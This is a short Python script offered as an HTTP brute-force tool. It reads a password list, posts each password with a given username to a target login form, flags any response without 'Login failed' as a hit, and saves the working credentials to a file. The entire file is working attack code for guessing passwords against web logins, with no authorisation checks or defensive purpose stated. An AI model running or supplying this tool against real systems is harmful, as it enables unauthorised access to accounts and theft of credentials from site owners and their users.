# Python Script for HTTP Brute Force

# Importing Modules
import requests, argparse
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RESET = Fore.RESET

def httpbrute(hostname, username, password):
    # Data needed
    data = {'username':username, 'password':password, "Login":'submit'}

    send_data_url = requests.post(hostname, data=data)
    if "Login failed" in str(send_data_url.content):
        print(f"[!] Invalid credentials for {username}:{password}")
    else:
        print(f"{GREEN}[+] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
        return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Bruteforce Python Script")
    parser.add_argument("host", help="Hostname or IP Address of Server to brute force")
    parser.add_argument("-P", "--passlist", help="Password list text file")
    parser.add_argument("-u", "--user", help="Host username")

    # Parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user

    # Read the file
    passlist = open(passlist).read().splitlines()

    # Start the brute force
    for password in passlist:
        if httpbrute(host, user, password):
            # Save valid combination to a file
            open("Credentials.txt", "w").write(f"{user}@{host}:{password}")
            break